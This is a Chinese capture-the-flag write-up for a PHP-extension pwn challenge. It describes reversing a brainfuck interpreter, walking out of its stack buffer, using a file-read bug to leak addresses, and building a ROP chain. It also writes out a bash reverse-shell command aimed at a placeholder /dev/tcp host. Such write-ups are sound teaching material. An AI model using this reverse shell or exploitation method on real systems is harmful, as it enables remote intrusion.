
## 题目考点

题目综合考察选手的逆向能力，pwn能力，以及对php extension机制的理解。

## 题解

1. 首先查看index.php，逻辑十分简单
```
<?php
if(isset($_GET['c'])) {
    gamebox($_GET['c']);
}
else if(isset($_GET['f'])){
    fileReader($_GET['f']);
}
else{
    highlight_file(__FILE__);
}
```

由此可知该题开放了两个功能，一个是文件读取，另一个即gamebox，而其功能实现都是extension做的。

2. 因为有任意文件读取（但无权限读flag），所以首先查看/proc/self/maps，发现libc的版本为2.28，可以直接下载，且在这一步，可以得到所有想要的地址。extension的目录为`/usr/local/lib/php/extensions/no-debug-non-zts-20170718/FileReader.so`，下载下来后逆向分析。

3. 两个功能函数分别为`zif_gamebox`与`zif_fileReader`。因为本题编写加了点goto混淆，所以zif_gamebox不太好逆，功能逻辑其实就是个原版的brainfuck解释器。唯一增加的是需要在payload头部加上`\x01`来激活解释器。输入payload，即`index.php?c=`时，没有栈溢出，超过栈数组长度的payload将会丢弃。主要的漏洞在于，brainfuck所使用的data_area也在栈上（512+64的一个数组，前512个byte放在brainfuck的code，后面64个byte即data_area）。

4. 通过`‘>’`与`‘<’`操作很方便就可以进行栈越界进而得到栈溢出。且`‘.’`功能为了方便解题，直接赠送了data_area的地址。`‘,’`为输入功能，会将下一个偏移作为输入的byte对当面data_area进行改写。

5. 明白上述逻辑后，就是一个比较纯粹的php栈溢出，因为有了所有的地址，所以反弹shell的rop还是比较容易实现的，要注意的是，我们可以用`‘,’`将反弹shell的`bash -c 'sh -i >&/dev/tcp/xxx.xx.xxx.xx/xxxx 0>&1'\x00`写在栈上，然后用memcpy之类的把这个string搬到比较稳定的位置（可以比较随意地从/proc/self/maps的rw region里挑，尽量从region末尾开始用，那边一般不会存储数据）

6. 具体的解法见`hack.py`，注意注释，根据实际情况换掉标注的address和string。